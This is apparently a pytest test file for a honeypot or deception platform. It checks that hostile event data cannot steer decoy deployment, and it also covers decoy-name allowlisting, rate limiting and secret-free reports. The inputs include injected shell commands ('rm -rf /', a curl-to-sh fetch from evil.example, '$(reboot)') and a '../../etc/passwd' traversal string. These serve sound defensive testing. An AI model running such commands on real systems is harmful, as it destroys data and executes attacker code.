from __future__ import annotations

import pytest


@pytest.mark.asyncio
async def test_attacker_input_never_becomes_a_command(context) -> None:
    """Hostile strings in event data must not influence which decoys are deployed."""
    payload = {
        "sensor": "honeyweb",
        "event_type": "http_suspicious_input",
        "source_ip": "10.66.0.6",
        "metadata": {
            "path": "/login?x=; rm -rf / --no-preserve-root",
            "command": "`curl http://evil.example | sh`",
            "target_host": "$(reboot)",
        },
    }
    response = await _post_events(context, payload)
    assert response == 200

    active = context.orchestrator.active
    assert active <= {"finance-srv", "hr-srv", "backup-srv"}


@pytest.mark.asyncio
async def test_decoy_names_are_allowlisted(context) -> None:
    from app.deception.orchestrator import UnknownDecoyError

    for hostile in ("../../etc/passwd", "prod-db", "shell", "*"):
        with pytest.raises(UnknownDecoyError):
            await context.orchestrator.activate(hostile)


@pytest.mark.asyncio
async def test_ingest_rate_limit_returns_429(settings, tmp_path) -> None:
    from httpx import ASGITransport, AsyncClient

    from app.main import create_app

    settings.ingest.rate_limit_per_minute = 3
    application = create_app(settings)
    async with (
        application.router.lifespan_context(application),
        AsyncClient(transport=ASGITransport(app=application), base_url="http://test") as client,
    ):
        payload = {
            "sensor": "honeynet",
            "event_type": "connection_attempt",
            "source_ip": "10.66.0.7",
        }
        statuses = []
        for _ in range(5):
            response = await client.post("/api/v1/ingest/events", json=payload)
            statuses.append(response.status_code)
        assert statuses[:3] == [200, 200, 200]
        assert 429 in statuses


@pytest.mark.asyncio
async def test_synthetic_credentials_are_clearly_marked(context) -> None:
    store = context.credentials
    store.seed_credentials()
    for password in store.credentials.values():
        assert any(marker in password for marker in ("SYNTH", "LabOnly", "Simulation"))


@pytest.mark.asyncio
async def test_report_contains_no_real_looking_secret_fields(context) -> None:
    from app.reports.generator import build_report

    await _post_events(
        context,
        {
            "sensor": "honeyssh",
            "event_type": "authentication_attempt",
            "source_ip": "10.66.0.8",
            "metadata": {"username": "admin", "result": "failure"},
        },
    )
    attackers, _ = await context.repository.list_attackers()
    report = await build_report(context.repository, attackers[0]["attacker_id"])
    assert report is not None
    forbidden = ("api_key", "aws_secret", "private_key", "password_hash")
    text = str(report).lower()
    assert all(field not in text for field in forbidden)


async def _post_events(context, payload) -> int:
    try:
        await context.collector.collect(_raw(payload))
    except ValueError:
        return 422
    return 200


def _raw(payload: dict):
    from app.events.normalizer import RawEvent

    return RawEvent(**payload)
